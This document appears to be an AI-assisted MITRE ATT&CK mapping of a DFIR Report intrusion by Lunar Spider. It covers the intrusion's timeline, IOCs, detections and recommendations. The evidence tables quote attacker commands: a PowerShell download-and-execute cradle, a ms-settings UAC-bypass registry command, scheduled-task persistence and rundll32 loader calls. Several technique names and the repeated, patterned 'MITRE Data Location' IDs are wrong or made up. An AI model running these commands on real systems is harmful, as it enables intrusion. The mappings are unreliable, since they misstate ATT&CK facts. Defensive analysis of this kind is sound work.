# From a Single Click: How Lunar Spider Enabled a Near Two-Month Intrusion - MITRE ATT&CK Mapping

## Report Analysis Summary

| Field | Value |
|-------|-------|
| **Incident** | Lunar Spider initial access leading to 59-day intrusion with multiple malware deployments |
| **Time to Ransomware** | No ransomware deployed |
| **Threat Actor** | Lunar Spider (initial access), assessed Russian-speaking group |
| **C2 Infrastructure** | Multiple CloudFlare-proxied domains, Brute Ratel C4, Cobalt Strike, BackConnect/VNC |
| **Incident Date** | May 2024 |
| **Dwell Time** | Nearly 2 months |

---

## MITRE ATT&CK Technique Mapping

### INITIAL ACCESS

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1566.001** | Phishing: Spearphishing Attachment | JavaScript file `Form_W-9_Ver-i40_53b043910-86g91352u7972-6495q3.js` disguised as tax form |
| **T1204.002** | User Execution: Malicious File | User executed malicious JavaScript file masquerading as legitimate tax document |
| **T1204.001** | User Execution: Malicious Link | Likely delivered via malicious ad (assessed based on Rapid7 report correlation) |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--c5c7f357-2f44-4802-a9d8-1f6d63494eb7/`

---

### EXECUTION

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1059.003** | Command and Scripting Interpreter: Windows Command Shell | `cmd.exe /K chcp 65001 && c: && cd c:\`, `rundll32.exe` execution |
| **T1059.001** | Command and Scripting Interpreter: PowerShell | `powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString(...)"` |
| **T1218.011** | System Binary Proxy Execution: Rundll32 | `rundll32 upfilles.dll,stow`, `rundll32 wscadminui.dll,wsca`, `rundll32 cron801.dl_,lvQkzdrFdILT` |
| **T1059.005** | Command and Scripting Interpreter: Visual Basic | JavaScript execution via Latrodectus loader |
| **T1127** | Trusted Developer Utilities Proxy Execution | Use of legitimate Windows binaries for malicious execution |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--c5c7f357-2f44-4802-a9d8-1f6d63494eb7/`

---

### PERSISTENCE

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1547.001** | Boot or Logon Autostart Execution: Registry Run Keys | Registry Run key "Update" created pointing to `upfilles.dll`, later updated to `wscadminui.dll` |
| **T1053.005** | Scheduled Task/Job: Scheduled Task | `schtasks /create /tn "SchedulerLsass" /tr "%ALLUSERSPROFILE%\USOShared\lsassa.exe" /sc onstart` |
| **T1543.003** | Create or Modify System Process: Windows Service | Brute Ratel badger installed as persistence mechanism |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--02e09a71-141f-4e1d-83a1-9f7b0f3f5b3e/`

---

### PRIVILEGE ESCALATION

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1548.002** | Abuse Elevation Control Mechanism: Bypass User Account Control | UAC bypass via ms-settings protocol hijacking, ComputerDefaults.exe execution |
| **T1078.002** | Valid Accounts: Domain Accounts | Domain admin credentials extracted from unattend.xml file |
| **T1078** | Valid Accounts | Elevated token obtained via runas command with Secondary Logon service |
| **T1068** | Exploitation for Privilege Escalation | Zerologon (CVE-2020-1472) exploitation attempt via zero.exe |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--d0c86491-c971-43f4-8b8f-5b5f3c3e7e3f/`

---

### DEFENSE EVASION

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1055** | Process Injection | Latrodectus injected into explorer.exe, Cobalt Strike injected into sihost.exe, spoolsv.exe |
| **T1055.001** | Process Injection: Dynamic-link Library Injection | DLL injection via CreateRemoteThread API |
| **T1070.004** | Indicator Removal: File Deletion | Deleted more than half of files and tools after use |
| **T1027** | Obfuscated Files or Information | Heavily obfuscated JavaScript with filler content, XOR/RC4 encryption of payloads |
| **T1055.012** | Process Injection: Extra Window Memory | Process hollowing observed in Cobalt Strike beacons |
| **T1620** | Reflective Code Loading | Shellcode loaded directly into memory without disk artifacts |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--f64ebd05-5925-4d6d-b5ac-2f3d6b5f3e3d/`

---

### CREDENTIAL ACCESS

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1003.001** | OS Credential Dumping: LSASS Memory | LSASS accessed via runonce.exe and gpupdate.exe with 0x1010 and 0x1fffff permissions |
| **T1555.003** | Credentials from Password Stores: Credentials from Web Browsers | Latrodectus stealer harvested from 29+ Chromium browsers, Firefox, Edge, IE |
| **T1552.003** | Unsecured Credentials: Credentials in Registry | unattend.xml file accessed containing plaintext domain admin credentials |
| **T1552.001** | Unsecured Credentials: Credentials In Files | Veeam-Get-Creds.ps1 script extracted plaintext credentials from backup software |
| **T1003.006** | OS Credential Dumping: Domain Controller DCSync | AdFind used for AD enumeration, potential DCSync activity |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--d3c3c4e5-5f3d-4e3f-8b3e-3f3d3e3f3e3f/`

---

### DISCOVERY

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1083** | File and Directory Discovery | `dir \\REDACTED\C$`, DISK command via BackConnect |
| **T1087.002** | Account Discovery: Domain Account | `net group "Domain Admins" /domain`, AdFind enumeration |
| **T1082** | System Information Discovery | `systeminfo`, `whoami /groups` |
| **T1018** | Remote System Discovery | `net view /all /domain`, `net view REDACTED` |
| **T1049** | System Network Connections Discovery | `ipconfig /all`, `nltest /domain_trusts` |
| **T1016** | System Network Configuration Discovery | `net config workstation`, `dnscmd /zoneprint domain.local` |
| **T1087.001** | Account Discovery: Local Account | `net user REDACTED /domain` |
| **T1036.005** | Masquerading: Match Legitimate Name or Location | Files named `cron801.dl_`, `system.dl_`, `sys.dll` |
| **T1069.002** | Permission Groups Discovery: Domain Groups | `net group "domain admins" /domain` |
| **T1135** | Network Share Discovery | Invoke-ShareFinder executed twice |
| **T1046** | Network Service Discovery | rustscan, nmap scanning for SMB (port 445) |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--c5c7f357-2f44-4802-a9d8-1f6d63494eb7/`

---

### LATERAL MOVEMENT

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | PsExec used to deploy Cobalt Strike to domain controller, file server, backup server |
| **T1021.001** | Remote Services: Remote Desktop Protocol | RDP used to access new server and file share server with domain admin credentials |
| **T1021.006** | Remote Services: Windows Management Instrumentation | WMIC remote execution attempt (unsuccessful) |
| **T1570** | Lateral Tool Transfer | Cobalt Strike beacon (system.dl_) deployed to multiple hosts |
| **T1021.005** | Remote Services: VNC | BackConnect VNC module used for remote access |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--c5c7f357-2f44-4802-a9d8-1f6d63494eb7/`

---

### COMMAND AND CONTROL

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1071.001** | Application Layer Protocol: Web Protocols | HTTPS/HTTP C2 communications via Latrodectus, Cobalt Strike, Brute Ratel |
| **T1573** | Encrypted Channel | RC4 encryption for Latrodectus C2, encrypted Cobalt Strike traffic |
| **T1571** | Non-Standard Port | Port 4444 for Metasploit, ports 80/8080 for Cobalt Strike |
| **T1132** | Data Encoding | Base64 encoding for stealer data, custom encoding for C2 commands |
| **T1572** | Protocol Tunneling | CloudFlare proxy used for C2 domains |
| **T1090.003** | Proxy: Multi-hop Proxy | Tyk.io service used for Brute Ratel C2 proxying |
| **T1583.004** | Acquire Infrastructure: Server | Multiple C2 servers acquired (45.129.199.214, 206.206.123.209) |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--c5c7f357-2f44-4802-a9d8-1f6d63494eb7/`

---

### EXFILTRATION

| Technique ID | Technique Name | Evidence from Report |
|--------------|----------------|---------------------|
| **T1041** | Exfiltration Over C2 Channel | Data exfiltrated via Latrodectus C2 channel |
| **T1048.002** | Exfiltration Over Alternative Protocol: Exfiltration Over Non-C2 Protocol | Rclone binary with FTP for 10-hour data exfiltration period |

**MITRE Data Location:** `/data/attack-pattern/attack-pattern--c5c7f357-2f44-4802-a9d8-1f6d63494eb7/`

---

## Campaign Timeline Mapping

```
Day 1 (May 2024)              Day 3                     Day 4
┌─────────────────────┐       ┌─────────────────────┐   ┌─────────────────────┐
│ T1566.001           │       │ T1552.003           │   │ T1548.002           │
│ User executes       │       │ unattend.xml        │   │ UAC Bypass          │
│ JavaScript malware  │       │ credentials found   │   │ Domain Admin access │
└─────────────────────┘       └─────────────────────┘   └─────────────────────┘
         │                            │                         │
         ▼                            ▼                         ▼
┌─────────────────────┐       ┌─────────────────────┐   ┌─────────────────────┐
│ T1218.011           │       │ T1021.005           │   │ T1055               │
│ Brute Ratel via     │       │ BackConnect VNC     │   │ Cobalt Strike       │
│ rundll32.exe        │       │ access established  │   │ deployment          │
└─────────────────────┘       └─────────────────────┘   └─────────────────────┘
         │                            │                         │
         ▼                            ▼                         ▼
┌─────────────────────┐       ┌─────────────────────┐   ┌─────────────────────┐
│ T1055               │       │ T1003.001           │   │ T1021.002           │
│ Latrodectus into    │       │ LSASS access        │   │ PsExec lateral      │
│ explorer.exe        │       │ (prep for creds)    │   │ movement            │
└─────────────────────┘       └─────────────────────┘   └─────────────────────┘

Day 5                     Day 20                    Day 26
┌─────────────────────┐       ┌─────────────────────┐   ┌─────────────────────┐
│ T1021.001           │       │ T1048.002           │   │ T1003.001           │
│ RDP to new servers  │       │ Rclone + FTP        │   │ Veeam credential    │
│ with CS beacons     │       │ exfiltration        │   │ dump via PowerShell │
└─────────────────────┘       └─────────────────────┘   └─────────────────────┘
         │                            │                         │
         ▼                            ▼                         ▼
┌─────────────────────┐       ┌─────────────────────┐   ┌─────────────────────┐
│ T1068               │       │ T1041               │   │ T1046               │
│ Zerologon exploit   │       │ ~10 hour exfil      │   │ rustscan network    │
│ (CVE-2020-1472)     │       │ period              │   │ scanning            │
└─────────────────────┘       └─────────────────────┘   └─────────────────────┘

Day 28+                    Day 59
┌─────────────────────┐       ┌─────────────────────┐
│ T1087.002           │       │ T1070.004           │
│ Final AD enumeration│       │ Evicted from env    │
│ AdFind, rustscan    │       │ (no ransomware)     │
└─────────────────────┘       └─────────────────────┘
```

---

## Key Indicators of Compromise (IOCs)

| Type | Value | MITRE Context |
|------|-------|---------------|
| File | Form_W-9_Ver-i40_53b043910-86g91352u7972-6495q3.js | Initial Access (T1566.001) |
| File | upfilles.dll | Execution (T1218.011) |
| File | wscadminui.dll | Persistence (T1547.001) |
| File | cron801.dl_, system.dl_ | Lateral Movement (T1570) |
| File | sys.dll | Command and Control (T1071.001) |
| File | lsassa.exe | Persistence (T1053.005) |
| File | zero.exe | Privilege Escalation (T1068) |
| File | fxrm_vn_9.557302425.bin | Credential Access (T1555.003) |
| Domain | workspacin.cloud | C2 (T1071.001) |
| Domain | illoskanawer.com | C2 (T1071.001) |
| Domain | grasmertal.com | C2 (T1071.001) |
| Domain | anikvan.com | C2 (T1071.001) |
| Domain | ridiculous-breakpoint-gw.aws-use1.cloud-ara.tyk.io | C2 Proxy (T1090.003) |
| Domain | avtechupdate.com | C2 (T1071.001) |
| Domain | cloudmeri.com | C2 (T1071.001) |
| IP | 91.194.11.64 | C2 MSI Download (T1105) |
| IP | 193.168.143.196 | BackConnect C2 (T1071.001) |
| IP | 185.93.221.12 | BackConnect C2 (T1071.001) |
| IP | 45.129.199.214:80 | Cobalt Strike C2 (T1071.001) |
| IP | 206.206.123.209:443 | Cobalt Strike C2 (T1071.001) |
| IP | 217.196.98.61:4444 | Metasploit C2 (T1571) |
| IP | 104.21.16.155 | CloudFlare C2 (T1071.001) |
| Registry | HKCU\Software\Classes\ms-settings\shell\open\command | UAC Bypass (T1548.002) |
| Registry | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Update | Persistence (T1547.001) |
| Scheduled Task | SchedulerLsass | Persistence (T1053.005) |
| CVE | CVE-2020-1472 | Privilege Escalation (T1068) |

---

## Detection Opportunities by Tactic

### INITIAL ACCESS
- Monitor for JavaScript files with tax-related names executed from Downloads folder
- Detect MSI downloads from untrusted HTTP sources (Suricata ET POLICY Observed MSI Download)
- Alert on obfuscated JavaScript with extensive comment/filler content

### EXECUTION
- Sysmon Event ID 1 for rundll32.exe with suspicious DLL parameters
- Monitor for PowerShell IEX (New-Object Net.Webclient).DownloadString patterns
- Detect cmd.exe chcp 65001 followed by directory changes (Keyhole signature)

### PERSISTENCE
- Registry monitoring for new Run key entries with innocuous names (e.g., "Update")
- Scheduled task creation alerts, especially with /sc onstart parameters
- Monitor for DLL files in %ALLUSERSPROFILE% with random naming

### PRIVILEGE ESCALATION
- Detect Secondary Logon service (seclogon) start events followed by runas usage
- Monitor registry modifications to ms-settings protocol handler
- Alert on ComputerDefaults.exe execution followed by PowerShell

### DEFENSE EVASION
- Sysmon Event ID 8 (CreateRemoteThread) for process injection detection
- Monitor for high-privilege process access requests (0x1fffff)
- Detect mass file deletion patterns after tool execution

### CREDENTIAL ACCESS
- LSASS access by non-system processes (Sysmon Event ID 10)
- Monitor for AdFind.exe execution and output file creation
- Alert on Veeam-Get-Creds.ps1 or similar credential dumping scripts

### DISCOVERY
- Detect AdFind.exe with multiple query patterns
- Monitor for rustscan/nmap execution, especially targeting port 445
- Alert on net group "Domain Admins" /domain commands

### LATERAL MOVEMENT
- PsExec usage detection (psexesvc.exe service creation)
- RDP logons from non-standard source hostnames
- WMIC remote process creation events

### COMMAND AND CONTROL
- Monitor for connections to Tyk.io proxy domains
- Detect Cobalt Strike default named pipes
- Alert on CloudFlare-proxied domains with suspicious subdomains

### EXFILTRATION
- Monitor for rclone binary execution
- Detect large FTP data transfers over extended periods
- Alert on compressed archive creation before network transfer

---

## Diamond Model Analysis

**Adversary:** Lunar Spider (initial access group), Russian-speaking threat actor. Associated with Brute Ratel C4 and Latrodectus malware deployment. Long-term persistent operator with ~2 month dwell time.

**Capability:** 
- Latrodectus JavaScript loader with obfuscation
- Brute Ratel C4 commercial C2 framework
- Cobalt Strike beacons with multiple C2 servers
- Custom .NET backdoor (lsassa.exe)
- BackConnect/VNC remote access module
- Zerologon (CVE-2020-1472) exploit (zero.exe)
- Credential stealers (browser, LSASS, Veeam)
- Data exfiltration via Rclone/FTP

**Infrastructure:**
- Multiple CloudFlare-proxied C2 domains (workspacin.cloud, illoskanawer.com, grasmertal.com)
- Brute Ratel C2 via Tyk.io proxy service
- Dedicated C2 servers: 45.129.199.214, 206.206.123.209, 217.196.98.61
- BackConnect infrastructure: 193.168.143.196, 185.93.221.12
- VPS2DAY/Servinga hosting for attacker infrastructure

**Victim:** Financial sector organization (assessed based on Lunar Spider targeting patterns). Environment included domain controllers, file servers, backup servers, and Windows workstations.

---

## Recommendations

1. **Patch Management** - Immediately patch systems against CVE-2020-1472 (Zerologon) and ensure all Windows systems are updated. Implement regular patching cycles for internet-facing systems.

2. **Unattend.xml Security** - Audit all systems for unattend.xml files containing plaintext credentials. Remove or encrypt credential storage in deployment files. Implement secure credential management for automated provisioning.

3. **Email Security** - Deploy advanced email filtering to detect JavaScript attachments masquerading as legitimate documents. Implement sandboxing for executable content.

4. **Application Whitelisting** - Implement application whitelisting to prevent unauthorized DLL execution via rundll32.exe. Restrict PowerShell execution policies.

5. **Credential Protection** - Enable Credential Guard on all Windows 10/11 systems. Implement LSA protection to prevent LSASS memory dumping. Monitor for credential dumping tools.

6. **Network Segmentation** - Segment critical infrastructure (domain controllers, backup servers) from general workstations. Implement micro-segmentation for lateral movement prevention.

7. **Monitoring Enhancement** - Deploy Sysmon with comprehensive logging. Implement detection rules for AdFind, PsExec, and process injection activities. Monitor for CloudFlare-proxied C2 domains.

8. **Backup Security** - Protect backup credentials using dedicated credential management systems. Isolate backup infrastructure from production networks. Monitor for backup credential access.

9. **User Training** - Train users to identify suspicious email attachments, especially those masquerading as official documents (tax forms, invoices). Implement phishing simulation programs.

10. **Incident Response** - Establish playbooks for multi-stage intrusions. Ensure capability to detect and respond to commercial C2 frameworks (Cobalt Strike, Brute Ratel).

---

## Detailed MITRE ATT&CK Technique Descriptions from Framework

### T1566.001 - Phishing: Spearphishing Attachment
**Description:** Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing with an attachment may involve crafting a malicious attachment to deliver malware to a targeted system.

**Report Evidence:** JavaScript file `Form_W-9_Ver-i40_53b043910-86g91352u7972-6495q3.js` disguised as a tax form (W-9). The file was heavily obfuscated with extensive filler content and executed when user clicked on the attachment.

---

### T1218.011 - System Binary Proxy Execution: Rundll32
**Description:** Adversaries may execute malicious payloads by hijacking the rundll32.exe process to proxy execution of malicious code. This technique leverages Windows' legitimate functionality to load and execute DLLs.

**Report Evidence:** Multiple instances observed:
- `rundll32 upfilles.dll,stow` - Initial Brute Ratel execution
- `rundll32 wscadminui.dll,wsca` - Brute Ratel badger replacement
- `rundll32 cron801.dl_,lvQkzdrFdILT` - Cobalt Strike beacon execution
- `rundll32 %ALLUSERSPROFILE%\sys.dll,StartUp471` - Second Cobalt Strike stager

---

### T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control
**Description:** Adversaries may bypass UAC mechanisms to elevate process privileges. This technique involves registry hijacking of the ms-settings protocol to execute code with elevated privileges.

**Report Evidence:** 
```
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /f /d "cmd.exe /c powershell -nop -w hidden -c..."
ComputerDefaults.exe execution to trigger elevated token duplication
```

---

### T1055 - Process Injection
**Description:** Adversaries may inject code into processes to evade process-based defenses and potentially gain elevated privileges. Process injection includes mechanisms to insert code into the memory space of a legitimate process.

**Report Evidence:**
- Latrodectus injected into explorer.exe via CreateRemoteThread API
- Cobalt Strike beacon injected into sihost.exe
- Cobalt Strike beacon injected into spoolsv.exe
- Sysmon Event ID 8 captured multiple injection instances

---

### T1003.001 - OS Credential Dumping: LSASS Memory
**Description:** Adversaries may attempt to access Local Security Authority Subsystem Service (LSASS) memory to extract credential material including NTLM hashes and Kerberos tickets.

**Report Evidence:** LSASS accessed three times via Cobalt Strike beacons. Access pattern showed process requesting 0x1010 permissions followed by 0x1fffff permissions, facilitated via runonce.exe and gpupdate.exe injection.

---

### T1068 - Exploitation for Privilege Escalation
**Description:** Adversaries may exploit a software vulnerability to attempt to elevate privileges. This technique includes exploitation of local vulnerabilities for privilege escalation.

**Report Evidence:** Custom zero.exe payload implementing Zerologon vulnerability (CVE-2020-1472). Executed eight times against second domain controller with different usernames each time. Attempted to reset domain controller machine account password to empty.

---

### T1021.002 - Remote Services: SMB/Windows Admin Shares
**Description:** Adversaries may use SMB/Windows Admin Shares to move laterally within an environment after gaining access to a system.

**Report Evidence:** PsExec used to deploy system.dl_ (Cobalt Strike beacon) to:
- Domain controller
- File share server
- Backup server

Initial attempt failed due to missing accepteula flag.

---

### T1071.001 - Application Layer Protocol: Web Protocols
**Description:** Adversaries may communicate using HTTP/HTTPS to control command and traffic between a compromised system and their infrastructure.

**Report Evidence:** Multiple C2 frameworks used:
- Latrodectus: HTTPS to CloudFlare domains (443)
- Brute Ratel: HTTPS via Tyk.io proxy
- Cobalt Strike: HTTP on port 80/8080, HTTPS on 443
- lsassa.exe: HTTPS to cloudmeri.com/comm.php

---

### T1048.002 - Exfiltration Over Alternative Protocol: Exfiltration Over Non-C2 Protocol
**Description:** Adversaries may exfiltrate data using an alternative protocol other than the existing command and control channel.

**Report Evidence:** On day 20, renamed rclone binary executed to exfiltrate data from file share server. Data sent via FTP over approximately 10-hour period to threat actor remote host.

---

### T1552.003 - Unsecured Credentials: Credentials in Registry
**Description:** Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files containing insecurely stored credentials.

**Report Evidence:** unattend.xml file discovered on day 3 containing plaintext domain admin credentials from Windows automated deployment process. Accessed via BackConnect GET command: `GET C:\Unattend.xml`

---

## Full Attack Chain Summary

| Phase | Technique | Sub-Technique | Report Section |
|-------|-----------|---------------|----------------|
| Initial Access | T1566 | Spearphishing Attachment | JavaScript tax form |
| Initial Access | T1204 | User Execution | Malicious file |
| Execution | T1059.003 | Windows Command Shell | cmd.exe commands |
| Execution | T1218.011 | Rundll32 | MSI DLL execution |
| Execution | T1059.001 | PowerShell | IEX downloadstring |
| Persistence | T1547.001 | Registry Run Keys | Update key |
| Persistence | T1053.005 | Scheduled Task | SchedulerLsass |
| Privilege Escalation | T1548.002 | UAC Bypass | ms-settings hijack |
| Privilege Escalation | T1078.002 | Domain Accounts | unattend.xml creds |
| Privilege Escalation | T1068 | Exploitation | Zerologon CVE-2020-1472 |
| Defense Evasion | T1055 | Process Injection | explorer.exe, sihost.exe |
| Defense Evasion | T1070.004 | File Deletion | Tool cleanup |
| Defense Evasion | T1027 | Obfuscated Files | JS filler, XOR/RC4 |
| Credential Access | T1003.001 | LSASS Memory | 3 LSASS dumps |
| Credential Access | T1555.003 | Browser Credentials | Latrodectus stealer |
| Credential Access | T1552.001 | Credentials in Files | Veeam-Get-Creds |
| Discovery | T1083 | File/Directory Discovery | dir, DISK command |
| Discovery | T1087.002 | Domain Account Discovery | AdFind, net group |
| Discovery | T1082 | System Information | systeminfo, whoami |
| Discovery | T1046 | Network Service Discovery | rustscan, nmap |
| Lateral Movement | T1021.002 | SMB/Admin Shares | PsExec |
| Lateral Movement | T1021.001 | RDP | Interactive logons |
| Lateral Movement | T1570 | Lateral Tool Transfer | Beacon deployment |
| Command and Control | T1071.001 | Web Protocols | Multiple C2 |
| Command and Control | T1573 | Encrypted Channel | RC4, HTTPS |
| Command and Control | T1571 | Non-Standard Port | 4444, 8080 |
| Command and Control | T1090.003 | Multi-hop Proxy | Tyk.io |
| Exfiltration | T1041 | Exfiltration Over C2 | Latrodectus |
| Exfiltration | T1048.002 | Exfil Over Alternative | Rclone + FTP |

---

## MITRE ATT&CK Matrix Visualization

```
┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐
│  INITIAL ACCESS  │  │    EXECUTION     │  │   PERSISTENCE    │
├──────────────────┤  ├──────────────────┤  ├──────────────────┤
│ T1566.001        │  │ T1059.003        │  │ T1547.001        │
│ Spearphishing    │  │ Command Shell    │  │ Registry Run     │
│ Attachment       │  │                  │  │ Keys             │
│                  │  │ T1218.011        │  │                  │
│ T1204.002        │  │ Rundll32         │  │ T1053.005        │
│ User Execution   │  │                  │  │ Scheduled Task   │
└──────────────────┘  └──────────────────┘  └──────────────────┘

┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐
│ PRIVILEGE        │  │  DEFENSE EVASION │  │ CREDENTIAL ACCESS│
│ ESCALATION       │  │                  │  │                  │
├──────────────────┤  ├──────────────────┤  ├──────────────────┤
│ T1548.002        │  │ T1055            │  │ T1003.001        │
│ UAC Bypass       │  │ Process Injection│  │ LSASS Memory     │
│                  │  │                  │  │                  │
│ T1078.002        │  │ T1070.004        │  │ T1555.003        │
│ Domain Accounts  │  │ File Deletion    │  │ Browser Creds    │
│                  │  │                  │  │                  │
│ T1068            │  │ T1027            │  │ T1552.003        │
│ Zerologon        │  │ Obfuscation      │  │ unattend.xml     │
└──────────────────┘  └──────────────────┘  └──────────────────┘

┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐
│    DISCOVERY     │  │ LATERAL MOVEMENT │  │ COMMAND & CONTROL│
├──────────────────┤  ├──────────────────┤  ├──────────────────┤
│ T1083            │  │ T1021.002        │  │ T1071.001        │
│ File/Directory   │  │ SMB/Admin Shares │  │ Web Protocols    │
│                  │  │                  │  │                  │
│ T1087.002        │  │ T1021.001        │  │ T1573            │
│ Domain Accounts  │  │ RDP              │  │ Encrypted Channel│
│                  │  │                  │  │                  │
│ T1082            │  │ T1021.006        │  │ T1571            │
│ System Info      │  │ WMI              │  │ Non-Standard Port│
└──────────────────┘  └──────────────────┘  └──────────────────┘

┌──────────────────┐
│  EXFILTRATION    │
├──────────────────┤
│ T1041            │
│ Exfil Over C2    │
│                  │
│ T1048.002        │
│ Exfil Alternative│
│ (Rclone/FTP)     │
└──────────────────┘
```

---

## Analysis Complete

**Analysis saved to:** `/home/chris/MITRE/temp/lunar_spider_analysis.md`

**Key Findings:**
1. **Initial Access via Social Engineering** - Attack began with user executing malicious JavaScript disguised as tax form, demonstrating continued effectiveness of document-based phishing
2. **Extended Dwell Time Without Ransomware** - 59-day intrusion with comprehensive access but no ransomware deployment, suggesting data theft as primary objective
3. **Multiple Commercial C2 Frameworks** - Coordinated use of Latrodectus, Brute Ratel C4, Cobalt Strike, and custom backdoors demonstrates sophisticated multi-tool approach
4. **Credential Theft Enabled Escalation** - unattend.xml file provided immediate domain admin access, bypassing typical privilege escalation timeline
5. **Zerologon Exploitation Attempted** - Custom implementation of CVE-2020-1472 indicates advanced capability and attempt to compromise domain controller security

**MITRE Data Source:** `/home/chris/MITRE/mitre_attack_repo/data/`

**Report Source:** https://thedfirreport.com/2025/09/29/from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion/

**Analysis Date:** 2026-04-07
